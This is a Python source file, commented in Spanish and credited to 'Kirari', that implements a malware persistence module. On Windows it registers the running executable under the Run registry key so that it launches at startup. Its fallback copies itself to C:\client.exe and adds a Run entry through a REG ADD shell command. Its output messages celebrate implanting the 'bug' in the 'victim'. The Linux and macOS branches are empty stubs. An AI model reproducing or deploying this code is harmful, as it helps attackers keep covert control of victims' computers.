
# MODULO DE PERSISTENCIA -> CREADO POR KIRARI

import os
import sys
import shutil

def windows_persistencia():

	try:
	
		from win32api import (GetModuleFileName, 
							  RegCloseKey, 
							  RegDeleteValue,
	                          RegOpenKeyEx, 
	                          RegSetValueEx)

		from win32con import (HKEY_LOCAL_MACHINE as HKCU, 
			 				  KEY_WRITE, 
			 				  REG_SZ)


		SUBKEY = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
		EJECUTABLE = sys.argv[0]
		RUTA = os.getcwd()+EJECUTABLE
		
		try:

			key = RegOpenKeyEx(HKCU, SUBKEY, 0, KEY_WRITE)
			RegSetValueEx(key, EJECUTABLE, 0, REG_SZ, RUTA)
			RegCloseKey(key)

		except WindowsError:
			return (False,"\n El bicho no se ha podido implantar \n")

		return (True,"\n Bicho implantado en cerebro victima con exito \n")

	except:
		destino = "C:\\client.exe"
		if not os.path.isfile(destino):
			shutil.copyfile(sys.argv[0],destino)

		os.system('REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v client /t REG_SZ /d "C:\\Users\\Testing\\client.exe"')
		return (True,"\n Bicho implantado en cerebro victima con exito \n")
		

def linux_persistencia():
	return (False,"\n El bicho no se ha podido implantar \n")

def mac_persistencia():
	return (False,"\n El bicho no se ha podido implantar \n")


def activar(plataforma):

	if plataforma=="win":
		proceso,msg = windows_persistencia()
		return proceso,msg

	elif plataforma=="linux":
		proceso,msg = linux_persistencia()
		return proceso,msg

	elif plataforma=="darwin":
		proceso,msg = mac_persistencia()
		return proceso,msg

	else:
		return (False,"\n El bicho no se ha podido implantar \n")
